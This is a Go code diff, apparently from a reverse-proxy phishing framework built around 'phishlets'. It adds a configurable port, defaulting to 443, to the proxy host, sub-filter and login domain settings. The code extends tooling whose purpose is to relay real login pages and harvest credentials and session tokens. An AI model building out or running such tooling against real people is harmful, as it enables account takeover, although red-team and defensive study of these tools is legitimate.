@@ -70,6 +70,7 @@ type ForcePost struct {
 
 type LoginUrl struct {
 	domain string `mapstructure:"domain"`
+	port   int    `mapstructure:"port"`
 	path   string `mapstructure:"path"`
 }
 
@@ -105,6 +106,7 @@ type ConfigProxyHost struct {
 	PhishSub   *string `mapstructure:"phish_sub"`
 	OrigSub    *string `mapstructure:"orig_sub"`
 	Domain     *string `mapstructure:"domain"`
+	Port       int     `mapstructure:"port"`
 	Session    bool    `mapstructure:"session"`
 	IsLanding  bool    `mapstructure:"is_landing"`
 	AutoFilter *bool   `mapstructure:"auto_filter"`
@@ -114,6 +116,7 @@ type ConfigSubFilter struct {
 	Hostname     *string   `mapstructure:"triggers_on"`
 	Sub          *string   `mapstructure:"orig_sub"`
 	Domain       *string   `mapstructure:"domain"`
+	Port         int       `mapstructure:"port"`
 	Search       *string   `mapstructure:"search"`
 	Replace      *string   `mapstructure:"replace"`
 	Mimes        *[]string `mapstructure:"mimes"`
@@ -157,6 +160,7 @@ type ConfigForcePost struct {
 
 type ConfigLogin struct {
 	Domain *string `mapstructure:"domain"`
+	Port   int     `mapstructure:"port"`
 	Path   *string `mapstructure:"path"`
 }
 
@@ -286,11 +290,14 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 		if ph.Domain == nil {
 			return fmt.Errorf("proxy_hosts: missing `domain` field")
 		}
+		if ph.Port == 0 {
+			ph.Port = 443
+		}
 		auto_filter := true
 		if ph.AutoFilter != nil {
 			auto_filter = *ph.AutoFilter
 		}
-		p.addProxyHost(*ph.PhishSub, *ph.OrigSub, *ph.Domain, ph.Session, ph.IsLanding, auto_filter)
+		p.addProxyHost(*ph.PhishSub, *ph.OrigSub, *ph.Domain, ph.Port, ph.Session, ph.IsLanding, auto_filter)
 	}
 	if len(p.proxyHosts) == 0 {
 		return fmt.Errorf("proxy_hosts: list cannot be empty")
@@ -421,7 +428,11 @@ func (p *Phishlet) LoadFromFile(site string, path string) error {
 	if fp.LoginItem.Path == nil {
 		return fmt.Errorf("login: missing `path` field")
 	}
-	p.login.domain = *fp.LoginItem.Domain
+	if fp.LoginItem.Port == 0 {
+		fp.LoginItem.Port = 443
+	}
+
+	p.login.domain = *fp.LoginItem.Domain + ":" + strconv.Itoa(fp.LoginItem.Port)
 	if p.login.domain == "" {
 		return fmt.Errorf("login: `domain` field cannot be empty")
 	}
@@ -680,10 +691,10 @@ func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[str
 	return ret
 }
 
-func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool) {
+func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, port int, handle_session bool, is_landing bool, auto_filter bool) {
 	phish_subdomain = strings.ToLower(phish_subdomain)
 	orig_subdomain = strings.ToLower(orig_subdomain)
-	domain = strings.ToLower(domain)
+	domain = strings.ToLower(domain) + ":" + strconv.Itoa(port)
 	if !p.domainExists(domain) {
 		p.domains = append(p.domains, domain)
 	}
